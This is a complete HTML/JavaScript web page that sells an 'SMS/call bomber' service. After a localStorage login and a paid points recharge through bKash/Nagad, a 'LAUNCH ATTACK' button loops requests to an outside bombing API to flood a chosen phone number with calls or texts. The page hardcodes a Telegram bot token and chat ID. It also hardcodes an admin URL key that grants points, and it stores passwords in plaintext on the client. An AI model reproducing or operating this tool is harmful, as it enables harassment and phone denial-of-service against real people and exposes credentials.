<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NAHID BOSS - ELITE BOMBER</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Hind+Siliguri:wght@300;400;600&display=swap');
        
        :root { 
            --matrix: #00ff41; 
            --matrix-dark: #008f11;
            --glow: 0 0 15px rgba(0, 255, 65, 0.6);
            --bg: #010101; 
        }

        body { 
            background: var(--bg); 
            color: #fff; 
            font-family: 'Hind Siliguri', sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            margin: 0; 
            padding: 15px;
        }

        .orbitron { font-family: 'Orbitron', sans-serif; }

        .glass-card {
            background: #080808;
            border: 2px solid var(--matrix-dark);
            box-shadow: var(--glow);
            border-radius: 20px;
            width: 100%;
            max-width: 380px;
            padding: 25px;
            position: relative;
        }

        .cyber-input {
            background: #000;
            border: 1px solid #1a1a1a;
            color: var(--matrix);
            padding: 12px;
            border-radius: 12px;
            width: 100%;
            text-align: center;
            font-size: 15px;
            margin-bottom: 12px;
            outline: none;
            transition: 0.3s;
        }
        .cyber-input:focus { 
            border-color: var(--matrix); 
            box-shadow: 0 0 10px var(--matrix); 
        }

        .btn-main {
            background: var(--matrix);
            color: #000;
            font-weight: 900;
            padding: 14px;
            border-radius: 12px;
            width: 100%;
            text-transform: uppercase;
            cursor: pointer;
            border: none;
            font-size: 14px;
            box-shadow: 0 0 15px var(--matrix);
            transition: 0.3s;
        }
        .btn-main:hover { transform: scale(1.02); }

        .tab-btn {
            flex: 1;
            padding: 12px;
            text-align: center;
            cursor: pointer;
            font-size: 13px;
            font-weight: bold;
            color: #333;
            border-bottom: 3px solid #111;
            transition: 0.3s;
        }
        .tab-btn.active { 
            color: var(--matrix); 
            border-color: var(--matrix); 
            text-shadow: 0 0 5px var(--matrix); 
        }

        .terminal {
            background: #000;
            height: 80px;
            font-size: 11px;
            color: var(--matrix);
            padding: 10px;
            border-radius: 10px;
            margin-top: 15px;
            overflow-y: auto;
            border: 1px solid #0a220a;
            font-family: 'Courier New', monospace;
        }

        .modal {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 100;
            backdrop-filter: blur(5px);
        }

        .dev-tag {
            text-align: center;
            font-size: 10px;
            color: #1a3a1a;
            margin-top: 20px;
            letter-spacing: 2px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <!-- 1. AUTH PANEL -->
    <div id="auth-box" class="glass-card">
        <div class="text-center mb-6">
            <i class="fas fa-shield-halved text-4xl text-[#00ff41] mb-2"></i>
            <h2 class="orbitron text-xl font-bold tracking-widest text-[#00ff41]">ELITE ACCESS</h2>
        </div>

        <div class="flex mb-5 bg-black rounded-xl p-1 border border-zinc-900">
            <div id="t-login" class="tab-btn active" onclick="setAuth('login')">LOGIN</div>
            <div id="t-reg" class="tab-btn" onclick="setAuth('register')">REGISTER</div>
        </div>

        <div id="auth-fields">
            <input type="text" id="user" placeholder="Username" class="cyber-input">
            <input type="password" id="pass" placeholder="Password" class="cyber-input">
            <button onclick="handleAuth()" class="btn-main orbitron">SECURE LOGIN</button>
        </div>
        
        <div class="dev-tag orbitron uppercase">Developer by NAHID BOSS</div>
    </div>

    <!-- 2. DASHBOARD -->
    <div id="dash-box" class="glass-card" style="display: none;">
        <div class="flex justify-between items-center mb-6">
            <div class="bg-black border border-green-900 px-4 py-2 rounded-full text-xs text-[#00ff41] orbitron shadow-inner">
                <i class="fas fa-bolt mr-2"></i> <span id="pts">0</span> PTS
            </div>
            <button onclick="openModal('pkg-modal')" class="bg-green-950 text-white text-[10px] px-4 py-2 rounded-xl orbitron font-bold border border-green-800">RECHARGE</button>
        </div>

        <div class="text-center mb-6">
            <h1 class="orbitron text-xl font-black text-[#00ff41] tracking-[5px]">STRIKE PANEL</h1>
        </div>

        <div class="flex mb-5 bg-black rounded-xl p-1 border border-zinc-900">
            <div id="mode-call" class="tab-btn active" onclick="setMode('call')"><i class="fas fa-phone mr-1"></i> CALL</div>
            <div id="mode-sms" class="tab-btn" onclick="setMode('sms')"><i class="fas fa-comment mr-1"></i> SMS</div>
        </div>

        <input type="tel" id="phone" placeholder="01XXXXXXXXX" class="cyber-input text-xl tracking-widest font-bold">
        <input type="number" id="count" value="10" class="cyber-input">
        
        <button onclick="startBombing()" id="bomb-btn" class="btn-main orbitron">LAUNCH ATTACK</button>
        
        <div class="terminal" id="term">> System Online...</div>
        
        <div class="flex justify-between items-center mt-6">
            <span class="text-[9px] text-zinc-800 orbitron">V4.0 STABLE</span>
            <button onclick="logout()" class="text-[9px] text-zinc-600 hover:text-red-500 uppercase orbitron transition-colors">Logout</button>
        </div>
        <div class="dev-tag orbitron uppercase" style="margin-top: 10px;">Developer by NAHID BOSS</div>
    </div>

    <!-- RECHARGE MODALS -->
    <div id="pkg-modal" class="modal">
        <div class="glass-card">
            <h3 class="orbitron text-center text-green-500 text-sm mb-6 tracking-widest uppercase">Select Package</h3>
            <div class="space-y-3">
                <div onclick="initPay(10, 20)" class="bg-black p-4 border border-zinc-900 rounded-xl flex justify-between items-center cursor-pointer hover:border-green-500 transition-all">
                    <span class="font-bold">10 Points</span> <span class="text-green-500 orbitron">20 BDT</span>
                </div>
                <div onclick="initPay(25, 50)" class="bg-black p-4 border border-zinc-900 rounded-xl flex justify-between items-center cursor-pointer hover:border-green-500 transition-all">
                    <span class="font-bold">25 Points</span> <span class="text-green-500 orbitron">50 BDT</span>
                </div>
                <div onclick="initPay(60, 100)" class="bg-black p-4 border border-zinc-900 rounded-xl flex justify-between items-center cursor-pointer hover:border-green-500 transition-all">
                    <span class="font-bold">60 Points</span> <span class="text-green-500 orbitron">100 BDT</span>
                </div>
            </div>
            <button onclick="closeModals()" class="w-full text-center text-[10px] text-zinc-700 mt-6 uppercase orbitron">Cancel</button>
        </div>
    </div>

    <div id="pay-modal" class="modal">
        <div class="glass-card">
            <h3 class="orbitron text-center text-green-500 text-sm mb-6 uppercase">Gateway</h3>
            <div class="flex gap-3 mb-6">
                <button id="b-bkash" onclick="selGw('Bkash','#e2136e')" class="flex-1 p-3 bg-[#e2136e] rounded-xl text-[10px] font-bold shadow-lg">BKASH</button>
                <button id="b-nagad" onclick="selGw('Nagad','#f7941d')" class="flex-1 p-3 bg-[#f7941d] rounded-xl text-[10px] font-bold shadow-lg">NAGAD</button>
            </div>
            
            <div id="pay-area" style="display:none">
                <div class="bg-black p-5 rounded-xl border border-zinc-800 text-center mb-5">
                    <p class="text-[9px] text-zinc-500 mb-2 uppercase" id="gw-name"></p>
                    <p class="text-xl font-bold tracking-[3px]">01856643500</p>
                    <p id="pay-info" class="text-[10px] text-green-500 mt-2 orbitron font-bold"></p>
                </div>
                <input type="text" id="trx" placeholder="Transaction ID (TrxID)" class="cyber-input">
                <button onclick="submitToBot()" class="btn-main orbitron">SUBMIT PAYMENT</button>
            </div>
            
            <button onclick="openModal('pkg-modal')" class="w-full text-[10px] text-zinc-700 mt-6 uppercase orbitron text-center">Go Back</button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8669883197:AAGD8jG6_1S28BOm9iUQQ-dQO0Kl3C2zVUY";
        const CHAT_ID = "7257965481";
        
        let authType = 'login';
        let currentUser = null;
        let activeMode = 'call';
        let isRunning = false;
        let selPts = 0; let selBdt = 0;

        window.onload = () => {
            const saved = localStorage.getItem('active_session');
            if(saved) { 
                currentUser = JSON.parse(localStorage.getItem('u_'+saved)); 
                showDash(); 
            }

            // --- ADMIN APPROVE LOGIC ---
            const params = new URLSearchParams(window.location.search);
            if(params.get('auth_key') === 'NAHID_ADMIN_ACCESS') {
                const targetUser = params.get('user');
                const addPoints = parseInt(params.get('points'));
                
                let userData = localStorage.getItem('u_'+targetUser);
                if(userData) {
                    userData = JSON.parse(userData);
                    userData.points += addPoints;
                    localStorage.setItem('u_'+targetUser, JSON.stringify(userData));
                    alert(`SUCCESS: ${addPoints} points added to ${targetUser}`);
                    window.location.href = window.location.origin + window.location.pathname;
                }
            }
        };

        function setAuth(m) {
            authType = m;
            document.getElementById('t-login').classList.toggle('active', m==='login');
            document.getElementById('t-reg').classList.toggle('active', m==='register');
        }

        function handleAuth() {
            const u = document.getElementById('user').value.trim();
            const p = document.getElementById('pass').value.trim();
            if(!u || !p) return alert("সব ঘর পূরণ করুন!");

            // Fingerprint to limit 1 account per device
            let deviceId = localStorage.getItem('fingerprint');
            if(!deviceId) {
                deviceId = 'DEV-' + Math.random().toString(36).substr(2, 9).toUpperCase();
                localStorage.setItem('fingerprint', deviceId);
            }

            let data = localStorage.getItem('u_'+u);

            if(authType === 'register') {
                // Security: Check if device already has an account
                const allKeys = Object.keys(localStorage).filter(k => k.startsWith('u_'));
                const alreadyExists = allKeys.some(k => JSON.parse(localStorage.getItem(k)).did === deviceId);
                
                if(alreadyExists) return alert("নিরাপত্তা ঝুঁকি: এক ফোনে একাউন্ট একটাই সম্ভব!");
                if(data) return alert("এই ইউজারনেম ইতিমধ্যে ব্যবহার করা হয়েছে!");

                currentUser = { user: u, pass: p, points: 5, did: deviceId };
                localStorage.setItem('u_'+u, JSON.stringify(currentUser));
                alert("নিবন্ধন সফল! ৫ বোনাস পয়েন্ট যোগ হয়েছে।");
            } else {
                if(!data || JSON.parse(data).pass !== p) return alert("ইউজারনেম বা পাসওয়ার্ড ভুল!");
                currentUser = JSON.parse(data);
            }

            localStorage.setItem('active_session', u);
            showDash();
        }

        function showDash() {
            document.getElementById('auth-box').style.display = 'none';
            document.getElementById('dash-box').style.display = 'block';
            updateUI();
        }

        function updateUI() {
            document.getElementById('pts').innerText = currentUser.points;
            localStorage.setItem('u_'+currentUser.user, JSON.stringify(currentUser));
        }

        function setMode(m) {
            activeMode = m;
            document.getElementById('mode-call').classList.toggle('active', m==='call');
            document.getElementById('mode-sms').classList.toggle('active', m==='sms');
        }

        async function startBombing() {
            const num = document.getElementById('phone').value;
            const lim = parseInt(document.getElementById('count').value);
            const term = document.getElementById('term');
            
            if(num.length < 11) return alert("সঠিক ফোন নাম্বার দিন!");
            if(currentUser.points < lim) return alert("পর্যাপ্ত পয়েন্ট নেই! রিচার্জ করুন।");
            
            if(isRunning) { isRunning = false; return; }
            isRunning = true;
            document.getElementById('bomb-btn').innerHTML = '<i class="fas fa-stop mr-2"></i> STOP STRIKE';
            
            term.innerHTML += `<br>> Target Locked: ${num}`;

            for(let i=1; i<=lim; i++) {
                if(!isRunning) break;
                
                currentUser.points--;
                updateUI();
                
                term.innerHTML += `<br>> [${i}] ${activeMode.toUpperCase()} Dispatched...`;
                term.scrollTop = term.scrollHeight;

                const url = activeMode === 'call' 
                    ? `https://api.paglahost.shop/SMS+call_BOMBAR/api1.php?phone=${num}`
                    : `https://api.paglahost.shop/SMS+call_BOMBAR/index.php?password=tast&phone=${num}`;
                
                try { await fetch(url, { mode: 'no-cors' }); } catch(e) {}
                await new Promise(r => setTimeout(r, 4000));
            }
            isRunning = false;
            document.getElementById('bomb-btn').innerHTML = 'LAUNCH ATTACK';
            term.innerHTML += `<br>> Mission Accomplished.`;
        }

        function openModal(id) { closeModals(); document.getElementById(id).style.display = 'flex'; }
        function closeModals() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
        
        function initPay(p, b) { selPts = p; selBdt = b; openModal('pay-modal'); }
        
        function selGw(m, c) { 
            document.getElementById('pay-area').style.display = 'block';
            document.getElementById('gw-name').innerText = m + " (Personal)";
            document.getElementById('pay-info').innerText = `${selBdt} BDT | ${selPts} PTS`;
        }

        async function submitToBot() {
            const trx = document.getElementById('trx').value.trim();
            if(trx.length < 6) return alert("সঠিক ট্রানজেকশন আইডি দিন!");
            
            // Generate Secured Approve Link
            const approveUrl = `${window.location.origin}${window.location.pathname}?auth_key=NAHID_ADMIN_ACCESS&user=${currentUser.user}&points=${selPts}`;
            
            const msg = `🚨 *NEW STRIKE PAYMENT* 🚨\n\n👤 *User:* ${currentUser.user}\n💰 *Amount:* ${selBdt} BDT\n💎 *Points:* ${selPts}\n🆔 *TrxID:* \`${trx}\`\n\n✅ [APPROVE THIS REQUEST](${approveUrl})`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
                alert("অনুরোধ পাঠানো হয়েছে! এডমিন চেক করে এপ্রুভ করলে পয়েন্ট পাবেন।");
                closeModals();
            } catch(e) { alert("Error sending request!"); }
        }

        function logout() { localStorage.removeItem('active_session'); location.reload(); }
    </script>
</body>
</html>
